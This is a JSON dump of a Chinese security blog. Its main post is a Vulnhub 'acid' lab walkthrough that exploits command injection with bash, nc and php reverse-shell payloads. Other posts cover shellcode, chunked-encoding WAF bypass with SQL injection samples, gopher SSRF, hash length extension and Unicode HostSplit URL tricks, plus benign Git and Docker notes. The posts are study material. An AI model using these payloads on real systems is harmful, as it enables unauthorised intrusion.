{"pages":[],"posts":[{"title":"Vulnhub靶机-acid","text":"靶机下载 配置使用Vmware中的kali和靶机，网络连接方式为桥接 信息收集查看kali所在的IP地址和子网 12345678910111213root@kaliattack:~# ip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000 link/ether 00:0c:29:75:0a:17 brd ff:ff:ff:ff:ff:ff inet 192.168.1.4/24 brd 192.168.1.255 scope global dynamic noprefixroute eth0 valid_lft 76222sec preferred_lft 76222sec inet6 fe80::20c:29ff:fe75:a17/64 scope link noprefixroute valid_lft forever preferred_lft forever 扫描靶机 1234567891011121314151617root@kaliattack:~# nmap -sP 192.168.1.4/24Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-19 12:54 CSTNmap scan report for 192.168.1.1 (192.168.1.1)Host is up (0.0024s latency).MAC Address: B4:DE:DF:5D:FE:70 (zte)Nmap scan report for 192.168.1.2 (192.168.1.2)Host is up (0.0023s latency).MAC Address: FC:7C:02:9C:00:59 (Phicomm (Shanghai))Nmap scan report for laptop-lkst0l6r (192.168.1.3)Host is up (0.000077s latency).MAC Address: 00:0E:C6:BB:D2:3F (Asix Electronics)Nmap scan report for acid (192.168.1.5)Host is up (0.00030s latency).MAC Address: 00:0C:29:83:5A:CF (VMware)Nmap scan report for kaliattack (192.168.1.4)Host is up.Nmap done: 256 IP addresses (5 hosts up) scanned in 1.97 seconds 靶机在 192.168.1.5，物理机在 192.168.1.3 扫描所有65535个端口，并做服务指纹识别 1234567891011root@kaliattack:~# nmap -p1-65535 -sV 192.168.1.5Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-20 10:34 CSTNmap scan report for acid (192.168.1.5)Host is up (0.0028s latency).Not shown: 65534 closed portsPORT STATE SERVICE VERSION33447/tcp open http Apache httpd 2.4.10 ((Ubuntu))MAC Address: 00:0C:29:83:5A:CF (VMware)Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 18.13 seconds 33447端口有web服务，apache 2.4.10。 扫描一下目录 1234567891011121314151617181920212223242526272829dirb http://192.168.1.5:33447-----------------DIRB v2.22By The Dark Raver-----------------START_TIME: Mon Jan 20 12:08:54 2020URL_BASE: http://192.168.1.5:33447/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt-----------------GENERATED WORDS: 4612---- Scanning URL: http://192.168.1.5:33447/ ----==&gt; DIRECTORY: http://192.168.1.5:33447/css/==&gt; DIRECTORY: http://192.168.1.5:33447/images/+ http://192.168.1.5:33447/index.html (CODE:200|SIZE:899)+ http://192.168.1.5:33447/server-status (CODE:403|SIZE:302)---- Entering directory: http://192.168.1.5:33447/css/ -------- Entering directory: http://192.168.1.5:33447/images/ ----+ http://192.168.1.5:33447/images/Thumbs.db (CODE:200|SIZE:31744)-----------------END_TIME: Mon Jan 20 12:09:02 2020DOWNLOADED: 13836 - FOUND: 3 漏洞挖掘查看index的网页源代码，最后一行有一串十六进制数字 1&lt;!--0x643239334c6d70775a773d3d--&gt; 转换成字符串 1d293LmpwZw== base64解码 1wow.jpg 访问一下wow.jpg，404，再看看上面的目录扫描结果，有个images目录，访问images/wow.jpg，看到了success。把这张图片保存下来，打开发现最后有一行 137:61:65:65:30:66:36:64:35:38:38:65:64:39:39:30:35:65:65:33:37:66:31:36:61:37:63:36:31:30:64:34 转换成字符串 17aee0f6d588ed9905ee37f16a7c610d4 目测是md5，解密得到63425，大概就是密码了，但是没地方可用。 换Dirbuster再扫描目录（要用big的字典），能扫到一个Challenge目录（扫了也就一个多小时吧），能看到下面cake.php, error.php, hacked.php, include.php, index.php ，还有js，styles，css，less各种文件夹。 cake.php无法访问，index需要邮箱和密码登录，include.php有包含漏洞，但没有上传点。 包含cake.php，发现又一串神秘数字 1&lt;!--0x5933566a4c6e4a34626e413d--&gt; 转字符串 1Y3VjLnJ4bnA= base64解码 1cuc.rxnp 但是不知道它是干嘛的。 访问cake.php能看到title的位置有/Magic_Box，访问一下返回了403，再用DIrbuster爆破一轮，扫到了low.php，command.php， tails.php。 low是一个空页面，command有命令执行，tails要求输入secretkey，63425和cuc.rxnp都没有用。 command的命令执行输入192.168.1.4;ls，返回 123456789101112131415PING 192.168.1.4 (192.168.1.4) 56(84) bytes of data.64 bytes from 192.168.1.4: icmp_seq=1 ttl=64 time=0.356 ms64 bytes from 192.168.1.4: icmp_seq=2 ttl=64 time=0.297 ms64 bytes from 192.168.1.4: icmp_seq=3 ttl=64 time=0.352 ms--- 192.168.1.4 ping statistics ---3 packets transmitted, 3 received, 0% packet loss, time 1998msrtt min/avg/max/mdev = 0.297/0.335/0.356/0.026 mscommand.phpcommand.php.savecommand2.php.savecommand2.php.save.1low.phpproctails.php 存在命令执行 漏洞利用反弹shell，先在kali上监听端口 1nc -lvvp 4444 利用命令执行反弹shell，url编码192.168.1.4;bash -i &gt;&amp; /dev/tcp/192.168.1.4/4444 0&gt;&amp;1 1%31%39%32%2E%31%36%38%2E%31%2E%34%3B%62%61%73%68%20%2D%69%20%3E%26%20%2F%64%65%76%2F%74%63%70%2F%31%39%32%2E%31%36%38%2E%36%34%2E%31%2F%34%34%34%34%20%30%3E%26%31 没有收到，换nc，192.168.1.4;nc -e /bin/bash -d 192.168.1.4 4444 1%31%39%32%2E%31%36%38%2E%31%2E%34%3B%6E%63%20%2D%65%20%2F%62%69%6E%2F%62%61%73%68%20%20%2D%64%20%31%39%32%2E%31%36%38%2E%31%2E%34%20%34%34%34%34 还不行，换php，192.168.1.4;php -r '$sock=fsockopen(&quot;192.168.1.4&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);' 1%31%39%32%2e%31%36%38%2e%31%2e%34%3b%70%68%70%20%2d%72%20%27%24%73%6f%63%6b%3d%66%73%6f%63%6b%6f%70%65%6e%28%22%31%39%32%2e%31%36%38%2e%31%2e%34%22%2c%34%34%34%34%29%3b%65%78%65%63%28%22%2f%62%69%6e%2f%73%68%20%2d%69%20%3c%26%33%20%3e%26%33%20%32%3e%26%33%22%29%3b%27 成功收到反弹的shell 获取信息su，提示must be run from a terminal。用python调用本地的shell 12echo &quot;import pty; pty.spawn('/bin/bash')&quot; &gt; /tmp/asdf.pypython /tmp/asdf.py 现在可以执行su了 cat /etc/passwd能发现acid用户，find / -user acid 2&gt;/dev/null查找acid的文件，不输出错误，发现/sbin/raw_vs_isi/hint.pcapng，下载下来看一下 1scp /sbin/raw_vs_isi/hint.pcapng root@192.168.1.4:/root/ 查看这个包，发现saman and nowadays he's known as 1337hax0r，su saman，密码就是1337hax0r，同样的密码登录root，得到flag。 参考文章：安全客文章","link":"/2020/01/19/acid/"},{"title":"PWN 入门","text":"星盟安全的 PWN 学习 基础ELFELF 是 linux 下的可执行文件，一个 C 语言源文件变为 ELF 文件会经历以下步骤 编译(compile)，从 C 源文件(a.c b.c)，变为汇编语言文件(a.s b.s) 汇编(assembly)，从汇编语言文件变为目标文件（a.o b.o，内容为机器码） 链接(link)，将多个目标文件与库文件链接成为一个可执行文件(ELF 文件) 链接库文件也是 ELF 文件，动态链接库后缀为 .so，静态链接库为 .a ELF 结构图 程序装载和虚拟内存段（segment）指程序在内存中的情况，节（section）则指程序在磁盘中的情况。一个段可能包含多个节，划分依据是 rwx 权限。 例如： 代码段（text segment）包含代码（RX）与只读数据（R），包括 .text、.rodata、.hash、.dynsym、.dynstr、.plt、.rel.got 节 数据段（data segment）包含可读写数据（RW），包括.data、.dynamic、.got、.got.plt、.bss 节 栈段（Stack segment） 每个进程有一个完整的进程空间（虚拟内存），共 4GB。其中低 3GB 为用户空间，高 1GB 为所有进程共享的内核空间。 虚拟内存的 mmap 段中的动态链接库仅在物理内存中装载一份。 虚拟地址空间（以64位为例） C 语言程序在内存中的组织 大端序与小端序（通常是小端序） 寄存器结构 程序执行过程 汇编常用汇编指令：MOV、LEA、ADD、SUB、PUSH、POP、CMP、JMP、J[condition]、CALL、LEAVE、RET。 溢出的概念：有符号数中，正数加正数只能是正数，负数加负数只能是负数，如果结果不对，就是产生了溢出 Shellcodepwn 中，shellcode 指可以启用 shell 进行交互的代码。 execve syscall，在x86 中汇编代码是 int 0x80，x64 中是 int 0x3b，Linux Syscall 调用表，根据调用表，需要执行以下步骤能够 getshell 设置 ebx 指向字符串 “/bin/sh” 设置 exc=0，edx=0 设置 eax=0xb int 0x80 触发中断 x86 shellcode 汇编代码： 123456789101112;;nasm -f elf32 i386.asm;;ld -m elf_i386 -o i386 i386.o;;objdump -d i386global _start_start: push &quot;/sh&quot; push &quot;/bin&quot; mov ebx, esp ;; ebx=&quot;/bin/sh&quot; xor edx, edx ;; edx=0 xor ecx, ecx ;; ecx=0 mov al, 0xb ;; al=0xb int 0x80 x64 shellcode 汇编代码： 1234567891011121314;;nasm -f elf64 x64.asm;;ld-m elf_x86_64 -o x64 x64.o;;objdump -d x64global _start_start: mov rbx,'/bin/sh' push rbx push rsp pop rdi xor esi, esi xor edx, edx push 0x3b pop rax syscall 使用 pwntools 生成 shellcode 123456from pwn import *# 32 位context(log_level = 'debug', arch ='i386', os = 'linux')# 64 位# context(log_level = 'debug', arch ='amd6', os = 'linux')shellcode = asm(shellcraft.sh())","link":"/2021/05/04/basic-pwn/"},{"title":"Cobalt Strike 相关","text":"东抄抄，西抄抄 CS 4.0 基本操作 Cobalt Strike 4.0 用户手册","link":"/2020/07/07/cobalt-strike/"},{"title":"HTTP 分块传输","text":"HTTP 分块传输 简介分块传输编码（Chunked transfer encoding）是指超文本传输协议（HTTP）中的一种数据传输机制，允许 HTTP 应用服务器发送给客户端应用（通常是浏览器）的数据可以分成多个部分，分块传输编码只在 HTTP协议1.1版本（HTTP/1.1）中提供。 一般情况HTTP请求包的Header包含Content-Length域来指明报文体的长度。有时候服务生成HTTP回应是无法确定消息大小的，比如大文件的下载，或者后台需要复杂的逻辑才能全部处理页面的请求，这时用需要实时生成消息长度，服务器一般使用chunked编码。 在进行Chunked编码传输时，在回复消息的Headers有Transfer-Encoding域值为chunked，表示将用chunked编码传输内容。 这在http协议中也是个常见的字段，用于http传送过程的分块技术，原因是http服务器响应的报文长度经常是不可预测的，使用Content-length的实体搜捕并不是总是管用。 分块技术的意思是说，实体被分成许多的块，也就是应用层的数据，TCP在传送的过程中，不对它们做任何的解释，而是把应用层产生数据全部理解成二进制流，然后按照MSS的长度切成一分一分的，一股脑塞到tcp协议栈里面去，而具体这些二进制的数据如何做解释，需要应用层来完成。 基础分块传输的 POST 数据包需添加 Header 1Transfer-Encoding: Chunked 请求体内容： 12345672 # 表示下面数据的个数，可以在后面添加分号作为注释id # 参数，id是两个字符，所以上面一行是22 # 同上=1 # 加上前面的 id，结果 POST 的数据是 id=10 # 分块传输用 0 和两个换行作为结束# 换行# 换行 Bypass WAF添加注释一些 WAF 已经对 Transfer-Encoding 的分块传输做了处理，可以把分块组合成完整的 HTTP 数据包，这时直接使用常规的分块传输方式进行绕过会被 WAF 识别。 分块传输可以在长度标识处加分号作为注释，如： 19;kdsafsa 原数据包： 123456789101112131415161718POST /xxxxxx.jsp HTTP/1.1......Transfer-Encoding: Chunked9xxxxxxxxx9xx=xxxxxx9xxxxxxxxx1d9&amp;a=1 and 32=20（两个换行） 加入注释的数据包： 123456789101112131415161718POST /xxxxxx.jsp HTTP/1.1......Transfer-Encoding: Chunked9xxxxxxxxx9xx=xxxxxx9xxxxxxxxx1;testsdasdsadd9;test&amp;a=1 and 3;test444442=20(两个换行) Bypass ModSecurityModSecurity 是加载在中间件上的插件，可以直接获取到完整的 HTTP 数据包然后匹配危险关键字，需要传畸形的数据包绕过。例如： 12345678POST /sql.php?id=2%20union HTTP/1.1......Transfer-Encoding: chunked1aa0(两个换行) 123456789101112POST /sql.php?id=1 HTTP/1.1Host: 10.10.10.10Connection: keep-aliveContent-Type: application/x-www-form-urlencodedTransfer-Encoding: chunkedContent-Length: 16312310(两个换行) 工具Github -Burp 插件","link":"/2020/06/19/chunked-transfer/"},{"title":"重要文件位置","text":"Nginx1234567配置文件存放目录： /etc/nginx主配置文件： /etc/nginx/conf/nginx.conf管理脚本： /usr/lib64/systemd/system/nginx.service模块： /usr/liib64/nginx/modules应用程序： /usr/sbin/nginx程序默认存放位置： /usr/share/nginx/html日志默认存放位置： /var/log/nginx Apache12345配置文件： /etc/httpd/conf/http.conf服务器根目录： /var/www/html访问日志文件： /var/log/httpd/access_log错误日志文件： /var/log/httpd/error_log模块存放位置： /usr/lib/httpd/modules SSH12345678910111213日志位置：# Redhat or Fedora Core:/var/log/secure# Mandrake, FreeBSD or OpenBSD:/var/log/auth.log# SuSE:/var/log/messages# Mac OS X (v10.4 or greater):/private/var/log/asl.log# Mac OS X (v10.3 or earlier):/private/var/log/system.log# Debian:/var/log/auth.log","link":"/2019/11/27/configure-position/"},{"title":"crypto","text":"一些密码学原理和工具 MD5算法 把消息分组，每组64 byte(512 bit)，。 对最后一个消息快（不足 56 byte）进行填充，留下最后的 8 byte 用来标识补充前消息的总长度，中间部分用padding 补位，以 0x80（0b10000000）开头，后面全0，直到长度达到 56 byte。 每个消息块第 57 byte开始存储补位前信息的长度（单位为bit），小端存储。例如：message填充后（hex） 16d 65 73 73 61 67 65 80 00000000..... （最后8byte） 38 00 00 00 00 00 00 00 MD5 有4个初始链变量，经过哈希摘要后，链变量的值会改变，最后一轮产生的链变量高低位呼唤就是计算出的MD5值。 1234A=0x67452301B=0xefcdab89C=0x98badcfeD=0x10325476 哈希长度扩展攻击受攻击的算法：MD4、MD5、RIPEMD-160、SHA-0、SHA-1、SHA-256、SHA-512、WHIRLPOOL 如果已知key的长度，原信息以及md5(key + message)，就可以得到后面添加任意字符的md6值md5(key + message + any)。 以md5为例，将原信息按md5填充后，得到了md5值，这个值实际上（如果有）就是下一个消息快计算的初始链变量高低位互换。也就是说我们在后面填充新的信息，用这个链变量继续按md5算法继续计算就能得到md5(secret + message + any)。","link":"/2020/03/12/crypto/"},{"title":"DNS 相关","text":"DNS 记录类型 A ：主机记录，说明域名对应的 IP 地址，为一个域名做多个 A 可以做流量均衡 AAAA ：IPv6 版本的 A 记录 NS ：Name Service，说明这个区域有哪些 DNS 服务器负责解析。 SOA ：说明 NS 记录中的多台服务器哪一台是主服务器 MX ：Mail Exchange，记录邮件服务器 Cname ：一个域名是另一个域名的别名 SRV ：服务器资源记录，说明服务器能够提供什么样的服务，可定位域控 PTR ：指针记录，是 A 记录的逆向记录 TXT ：包含某个主机名或域名的说明，应用之一为 SPF 防止邮件欺骗 相关的攻击手法DNS RebindingDNS 重绑定攻击，攻击者首先自己搭建一个DNS解析服务器，让自己控制的域名在发生第一次DNS解析的时候指向攻击者的服务器，以后都解析到127.0.0.1。这样当受害者访问攻击者的页面的时候，会从攻击者的服务器上拉取攻击代码，后面的对攻击者域名的请求，会指向本地，即127.0.0.1。由于DNS的解析结果存在一定的缓存时间，在浏览器里大概需要1分钟的时间才会失效进行第二次解析。在发生第二次解析的时候，其指向的IP地址会变为127.0.0.1。虽然 DNS 解析指向的服务器变了，但是域名没变，浏览器仍然遵循同源策略，这样就能往本地端口发送请求并获取数据，甚至传输到其他站点了。","link":"/2021/03/18/dns/"},{"title":"CTFd 搭建","text":"系统 Ubuntu 16.04 LTS，腾讯云 准备安装 docker 和 docker-compose 安装1sudo git clone https://github.com/isislab/CTFd.git 进入目录 1docker-compose up -d","link":"/2020/08/03/ctfd/"},{"title":"Docker","text":"Docker，Docker Compose 和 Docker Swarm Docker 架构Docker 包含三个基本概念： 镜像（Image）：相当于一个 root 文件系统 容器（Container）：容器时镜像运行的实体，可以创建、启动、停止、删除、暂停等 仓库（Repository）：可以看作代码控制中心，用于保存镜像 Docker 使用 C/S 架构模式，使用远程 API 管理和创建 Docker 容器，Docker 容器通过 Docker 镜像创建。 Docker 客户端（Client）通过命令行或者其他工具使用 Docker SDK 与 Docker 守护进程通信；Docker 主机（Host）用于运行 Docker 守护进程。 Docker Machine 是一个简化 Docker 安装的命令行工具。 Docker 安装Docker 使用容器镜像仓库DockerfileDocker ComposeDocker MachineSwarm 集群管理简介Docker Swarm 是 Docker 的集群管理工具，将Docker 主机池转变为单个虚拟 Docker 主机。Docker Swarm 提供了标准的 Docker API，所有任何已经与 Docker 守护进程通信的工具都可以使用 Docker Swarm 轻松拓展到多个主机。 原理Swarm 集群由管理节点（manager）和工作节点（work node）组成。管理节点负责整个集群的管理工作，包括集群配置，服务管理等；工作节点主要负责云翔响应的服务来执行任务（task）。 ![Docker Swarm原理](Docker Swarm原理.png) 使用","link":"/2020/08/06/docker/"},{"title":"Gopher 协议利用","text":"gopher 协议利用 Gopher 协议Gopher 是一个通信协议，用来设计，分配，搜索与检索文档中的 internet 协议的网络。利用 gopher 可以对 FTP，telnet，redis，memcache，基于一个 TCP 包的 exploit 等进行内网攻击，扩展了攻击面。 格式1gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt; 如果省略 port，默认为 70 端口 gopher-path 可以是以下几种格式之一： 1234空 # 定界“/”也可以为空， gophertype 默认为 “1”&lt;gophertype&gt;&lt;selector&gt;&lt;gophertype&gt;&lt;selector&gt;%09&lt;search&gt;&lt;gophertype&gt;&lt;selector&gt;%09&lt;search&gt;%09&lt;gopher_string&gt; gophertype 是一个单字符字段，表示 URL 所引用资源的 gopher 类型 selector 是 gopher 选择器字符串。在 gopher 协议中， gopher 选择器字符串，是一个8位字节序列，可以包含除 09H（制表符），0AH（LF）和 0DH（CR）以外的任意8位字节。 search 用于向 gopher 搜索引擎提交搜索数据，和 selector 之间用 %09 分隔。 gopher 客户端通过将 gopher selector 字符串发送到 gopher 服务器来指定要检索的项目 转换规则 如果第一个字符是&gt;或者&lt; 那么丢弃该行字符串，表示请求和返回的时间。 如果前3个字符是+OK 那么丢弃该行字符串，表示返回的字符串。 将\\r字符串替换成%0d%0a。 空白行替换为%0a。 问号需要转码为URL编码%3f，同理空格转换成%20。 在包的最后要加%0d%0a，代表消息结束。 转换实例需要在传输的数据前加一个无用字符 使用 gopher 协议发送 HTTP 请求 一个简单的 GET 请求： 123GET /edit.php?a=Hi HTTP/1.1Host: 127.0.0.1Connection: close 依照转换规则，转换为 gopher 协议 1gopher://192.168.11.1:80/_GET%20/edit.php%3fa=Hi%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0aConnection:%20close%0d%0a POST 同理 12345POST /edit.php HTTP/1.1Host: 127.0.0.1Connection: closeContent-Type: application/x-www-form-urlencodeda=Hi 转换后 1gopher://192.168.11.1:80/_POST%20/edit.php%3fa=Hi%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0aConnection:%20close%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0a 工具Gopherus FTPTCP 流 1234567USER &lt;user&gt;PASS &lt;pass&gt;PWDEPSVTYPE ALISTQUIT redisMysqlFAST CGIXXE","link":"/2020/10/03/gopher/"},{"title":"Git 笔记","text":"Git 笔记 Git 工作流程Git 一般工作流程如下： 克隆 git 资源/新建 git 仓库 作为工作目录 添加或修改文件 如果其他人修改了，你可以更新资源 在提交前查看修改 提交修改 在修改完成后，如果发现错误，可以撤回提交并再次修改提交 Git 工作区、暂存区和版本库工作区：工作目录 暂存区(index/stage)：一般存放在.git/index中 版本库：.git隐藏目录 左侧为工作区，右侧为版本库，版本库中标记 index 的位置为暂存区，标记 master 的是 master 分支代表的目录树。 图中我们可以看出此时 HEAD 实际是指向 master 分支的一个”游标”。所以图示的命令中出现 HEAD 的地方可以用 master 来替换。 图中的 objects 标识的区域为 Git 的对象库，实际位于 .git/objects目录下，里面包含了创建的各种对象及内容。 当对工作区修改（或新增）的文件执行 git add 命令时，暂存区的目录树被更新，同时工作区修改（或新增）的文件内容被写入到对象库中的一个新的对象中，而该对象的ID被记录在暂存区的文件索引中。 当执行提交操作git commit时，暂存区的目录树写到版本库（对象库）中，master 分支会做相应的更新。即 master 指向的目录树就是提交时暂存区的目录树。 当执行 git reset HEAD 命令时，暂存区的目录树会被重写，被 master 分支指向的目录树所替换，但是工作区不受影响。 当执行 git rm --cached &lt;file&gt;命令时，会直接从暂存区删除文件，工作区则不做出改变。 当执行 git checkout . 或者 git checkout -- &lt;file&gt;&quot;命令时，会用暂存区全部或指定的文件替换工作区的文件。这个操作很危险，会清除工作区中未添加到暂存区的改动。 当执行 git checkout HEAD .或者 git checkout HEAD &lt;file&gt; 命令时，会用 HEAD 指向的 master 分支中的全部或者部分文件替换暂存区和以及工作区中的文件。这个命令也是极具危险性的，因为不但会清除工作区中未提交的改动，也会清除暂存区中未提交的改动。 创建仓库git init，初始化一个 git 仓库，默认在当前目录创建，也可以使用git int &lt;directory&gt;在指定目录创建。 创建完成后，新的仓库下会出现.git目录，git 需要的数据和资源存放在这里。如果有想要加入版本控制的文件，需要先使用git add对这些文件进行跟踪，然后提交。 123git add *.cgit add READMEgit commit -m '初始化' git clone，从现有仓库拷贝项目，格式为git clone &lt;repo&gt;，如果要克隆到指定的目录，使用git clone &lt;repo&gt; &lt;directory&gt; 基本操作 命令 作用 git init &lt;directory&gt; 在当前目录初始化仓库或者在指定目录初始化仓库 git clone &lt;repo&gt; 克隆指定仓库 git add &lt;file&gt; 将指定文件添加到缓存 git status 查看项目状态 git diff 查看项目详细信息 git commit 将缓存区的内容添加到仓库中 git config 配置用户名或邮箱地址 git reset HEAD&lt;file&gt; 取消已缓存的内容 git rm &lt;file&gt; 删除文件并从已跟踪的文件清单中清除。如果删除之前修改过并且已经放到暂存区，需要添加-f。如果仅仅想从已跟踪的文件清单中清楚使用--cache git mv 移动或重命名一个文件、目录或软链接 分支管理 命令 作用 git branch 列出当前分支，使用git branch &lt;name&gt;创建新分支 git checkout &lt;branch&gt; 切换到另一个分支，使用-b选项创建新分支并切换到该分支，使用-d选项删除分支 git merge &lt;branch&gt; 合并分支 查看提交历史使用git log查看提交历史，--oneline查看简洁版本，graph查看历史中什么时候出现分支，--reverse逆向显示，author查看指定用户的提交日志，--since和--before指定时间。 标签项目到达一个截断，可以使用git tag打上标签 -a使用带注解的标签，使用不带参数的命令查看所有标签，使用-m指定信息，使用-s添加PGP签名标签。","link":"/2020/06/23/git/"},{"title":"Host-Split attack","text":"[Black Hat USA 2019 PPT Presentation](https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pd f) 背景：Unicode 域名（IDN, Internationalizing domain name）如何工作𓀬.net，这样的域名底层依然是ASCII，对应xn--fq7d.net。 Unicode转化为ASCII。 标准化（Normalization），例如：Å(U+00C5)、Å(U+212B)、Å(U+0041, U+030A)都会被标准化为å(U+00E5)。 Punycoding, 把Unicode转化为ASCII。FISKMÅS转化为xn--fiskms-mus，xn--是punycode的标志，fiskms是ASCII部分，-mus是状态机指令。 ASCII转化为Unicode：只需要运行 Punycode状态机并且 rehydrate the Unicode(?). HostSplit Vulnerability - making URL ‘s that switch domains例如，攻击OAuth： OAUTH Authorization Code Flow(RFC 6749 4.1)，Client web site 发送 Application ID, Redirect URI 到认证服务器，认证服务器发送 Authorization Code（Sent to redirect URI）回Client web site。 认证服务器存有 allow list pattern 用于验证 redirect URI。在OAuth 1.0中，常用类似*.office.com的allow list。http://evil.c℀.office.com能正常工作，检查这个域名是否在allow list中时会标准化，然后将浏览器重定向到https://evil.ca/c.office.com。 现在的OAuth实现使用了更严格的allow list patterns，通常使用确定的域名。以上例子只能绕过子域名检查。 在标准化步骤，有一些Unicode字符可能转化成了带有语法标志的ASCII字符，例如：℀(U+2100)对应a/c。于是https://evil.c℀.example.com会变成https://evil.ca/c.example.com，这样就不会执行第二步 Punycoding，因为这里全部都是ASCII字符。 Edge/IE有这样的问题，.Net，python和java也存在类似的问题。 Example exploit - stealing OAUTH tokens from O365Ofiice.live.com 接受 Office OAUTH tokens 并且可以重定向到dropbox.com或者它的子域名。 https://office.live.com/start/word.aspx?h4b=dropbox&amp;eurl=https://fake.c%E2%84%80.dropbox.com/wopi_edit/document1.docx&amp;furl=https://www.dropbox.com/wopi_download/document1.docx&amp;c4b=1，这个URL作为OAUTH target可以盗取tokens。 但是一个bug拯救了它。 What was vulnerable / what’s still vulnerableNot just OAUTH ，Edge/IE和℀。 遵循IDNA2008并设置UseSTD3ASCIIRules可以修复了，但没有广泛采用。UseSTD3ASCIIRules只允许少量Unicode字符，已在使用的域名中有很多不符合这样的要求。 Egde/IE修复了漏洞（CVE-2019-0654），Firefox，Chrome安全，Safari可能存在风险。 .Net.Net曾经存在风险： 1234string url = @&quot;http://canada.c℀.products.office.com/test/exe&quot;;UriBuilder uriBuilder = new UriBuilder(url);IdnMapping idnMapping = new IdnMapping();System.Console.WriteLine(url); 输出http://canada.ca/c.products.office.com/test.ext。目前已修复（CVE-2019-0657）。 Pythonpython存在风险： 123456789101112&gt;&gt;&gt; from urllib.parseimport urlsplit, urlunsplit&gt;&gt;&gt; url= 'http://canada.c℀.microsoft.com/some.txt'&gt;&gt;&gt; parts = list(urlsplit(url))&gt;&gt;&gt; host = parts[1]&gt;&gt;&gt; host'canada.ca/c.microsoft.com'&gt;&gt;&gt; newhost= []&gt;&gt;&gt; for h in host.split('.'):... newhost.append(h.encode('idna').decode('utf-8'))...&gt;&gt;&gt; parts[1] = '.'.join(newhost)&gt;&gt;&gt; finalUrl= urlunsplit(parts)&gt;&gt;&gt; finalUrl'http://canada.ca/c.microsoft.com/some.txt' 还有变体： 12345678910&gt;&gt;&gt; from urllib.parseimport urlparse&gt;&gt;&gt; r='http://bing.com'+u'\\uFF03'+':password@products.office.com'&gt;&gt;&gt; o = urlparse(r)&gt;&gt;&gt; o.hostname'products.office.com'&gt;&gt;&gt; a = r.encode(&quot;IDNA&quot;).decode(&quot;ASCII&quot;)&gt;&gt;&gt; a'http://bing.com#:password@products.office.com'&gt;&gt;&gt; o = urlparse(a)&gt;&gt;&gt; o.hostname'bing.com' 分别在 CVE-2019-9636 和 CVE-2019-10160 中修复。 Java1234567891011121314import java.net.*;public class IDNTest{ public static void main(String[] args) throws Exception { String idnTest = &quot;evil.C\\u20100B.microsoft.com&quot;; String result = IDN.toASCII(idnTest); System.out.print(result + &quot;\\n&quot;); URL myUrl = new URL(&quot;http://evil.c\\u2100B.microsoft.com&quot;); System.out.print(myUrl.getHost() + &quot;\\n&quot;); }} 输出http://evil.CA/B.Microsoft.com 在 CVE-2019-2816 / S8221518 修复。 WindowsWindows API IdnToASCII存在问题，设置标志IDN_USE_STD3ASCII_RULES可以解决。 LinuxLibIDN和 LibIDN2 存在问题，LibIDN设置usestd3asciiruls标志，LibIDN2设置no-tr46标志。","link":"/2020/03/12/host-split-attack/"},{"title":"kalinethunter","text":"","link":"/2019/10/11/kalinethunter/"},{"title":"解决 Hexo 的 FATAL Something is wrong","text":"使用的 hexo 搭建博客，主题是 icarus 更新时出现以下错误： 12345678910111213141516171819202122232425262728293031323334353637$ hexo gINFO ======================================= ██╗ ██████╗ █████╗ ██████╗ ██╗ ██╗███████╗ ██║██╔════╝██╔══██╗██╔══██╗██║ ██║██╔════╝ ██║██║ ███████║██████╔╝██║ ██║███████╗ ██║██║ ██╔══██║██╔══██╗██║ ██║╚════██║ ██║╚██████╗██║ ██║██║ ██║╚██████╔╝███████║ ╚═╝ ╚═════╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═════╝ ╚══════╝=============================================INFO Checking dependenciesINFO Validating the configuration fileINFO Start processingFATAL Something's wrong. Maybe you can find the solution here: https://hexo.io/docs/troubleshooting.htmlTemplate render error: (unknown path) Error: filter not found: filter at Object._prettifyError (F:\\blog\\node_modules\\nunjucks\\src\\lib.js:36:11) at F:\\blog\\node_modules\\nunjucks\\src\\environment.js:567:19 at Template.root [as rootRenderFunc] (eval at _compile (F:\\blog\\node_modules\\nunjucks\\src\\environment.js:637:18), &lt;anonymous&gt;:21:3) at Template.render (F:\\blog\\node_modules\\nunjucks\\src\\environment.js:556:10) at Environment.renderString (F:\\blog\\node_modules\\nunjucks\\src\\environment.js:380:17) at Promise.fromCallback.cb (F:\\blog\\node_modules\\hexo\\lib\\extend\\tag.js:123:48) at tryCatcher (F:\\blog\\node_modules\\bluebird\\js\\release\\util.js:16:23) at Function.Promise.fromNode.Promise.fromCallback (F:\\blog\\node_modules\\bluebird\\js\\release\\promise.js:185:30) at Tag.render (F:\\blog\\node_modules\\hexo\\lib\\extend\\tag.js:123:18) at Object.onRenderEnd (F:\\blog\\node_modules\\hexo\\lib\\hexo\\post.js:280:20) at Promise.then.then.result (F:\\blog\\node_modules\\hexo\\lib\\hexo\\render.js:64:19) at tryCatcher (F:\\blog\\node_modules\\bluebird\\js\\release\\util.js:16:23) at Promise._settlePromiseFromHandler (F:\\blog\\node_modules\\bluebird\\js\\release\\promise.js:517:31) at Promise._settlePromise (F:\\blog\\node_modules\\bluebird\\js\\release\\promise.js:574:18) at Promise._settlePromise0 (F:\\blog\\node_modules\\bluebird\\js\\release\\promise.js:619:10) at Promise._settlePromises (F:\\blog\\node_modules\\bluebird\\js\\release\\promise.js:699:18) at _drainQueueStep (F:\\blog\\node_modules\\bluebird\\js\\release\\async.js:138:12) at _drainQueue (F:\\blog\\node_modules\\bluebird\\js\\release\\async.js:131:9) at Async._drainQueues (F:\\blog\\node_modules\\bluebird\\js\\release\\async.js:147:5) at Immediate.Async.drainQueues 